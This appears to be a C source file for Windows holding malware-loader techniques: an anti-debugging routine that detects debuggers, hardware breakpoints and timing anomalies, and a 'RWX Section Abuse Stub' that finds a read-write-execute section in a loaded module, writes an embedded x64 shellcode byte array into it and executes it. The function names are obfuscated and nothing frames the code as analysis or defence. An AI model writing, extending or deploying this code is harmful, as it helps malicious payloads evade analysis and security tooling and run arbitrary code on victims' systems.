#include <windows.h>
#include <winnt.h>

// Advanced Anti-Debug Techniques
bool asm_func_6550() {
    // TLS Callback anti-debug
    if (IsDebuggerPresent()) return false;
    
    // PEB check
    BOOL isDebugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
    if (isDebugged) return false;
    
    // Hardware breakpoint detection
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return false;
    }
    
    // Timing check
    DWORD start = GetTickCount();
    Sleep(100);
    DWORD end = GetTickCount();
    if ((end - start) > 200) return false;  // Debugger detected
    
    return true;
}


// RWX Section Abuse Stub
// Finds and abuses existing RWX sections in loaded modules
#include <windows.h>
#include <psapi.h>

static unsigned char var_2157[] = {
    0x48, 0x83, 0xec, 0x28, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x8d, 0x15, 0x66, 0x00, 0x00, 0x00, 0x48,
    0x8d, 0x0d, 0x52, 0x00, 0x00, 0x00, 0xe8, 0x9e, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0xf8, 0x48, 0x8d,
    0x0d, 0x5d, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x83, 0xc4, 0x28, 0xc3
};

LPVOID asm_func_3478() {
    HMODULE modules[1024];
    DWORD needed;
    
    if (EnumProcessModules(GetCurrentProcess(), modules, sizeof(modules), &needed)) {
        for (unsigned int i = 0; i < needed / sizeof(HMODULE); i++) {
            MODULEINFO modInfo;
            if (GetModuleInformation(GetCurrentProcess(), modules[i], &modInfo, sizeof(modInfo))) {
                PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)modInfo.lpBaseOfDll;
                PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)dosHeader + dosHeader->e_lfanew);
                PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
                
                for (int j = 0; j < ntHeaders->FileHeader.NumberOfSections; j++) {
                    // Look for sections with RWX characteristics
                    if ((sectionHeader[j].Characteristics & IMAGE_SCN_MEM_READ) &&
                        (sectionHeader[j].Characteristics & IMAGE_SCN_MEM_WRITE) &&
                        (sectionHeader[j].Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
                        
                        LPVOID sectionAddr = (LPVOID)((BYTE*)modInfo.lpBaseOfDll + sectionHeader[j].VirtualAddress);
                        if (sectionHeader[j].Misc.VirtualSize >= sizeof(var_2157)) {
                            return sectionAddr;
                        }
                    }
                }
            }
        }
    }
    return NULL;
}

void asm_func_5769() {
    LPVOID rwx_section = asm_func_3478();
    if (rwx_section) {
        // Backup original data
        BYTE* backup = (BYTE*)malloc(sizeof(var_2157));
        memcpy(backup, rwx_section, sizeof(var_2157));
        
        // Copy our payload
        memcpy(rwx_section, var_2157, sizeof(var_2157));
        
        // Execute
        ((void(*)())rwx_section)();
        
        // Restore original data
        memcpy(rwx_section, backup, sizeof(var_2157));
        free(backup);
    }
}

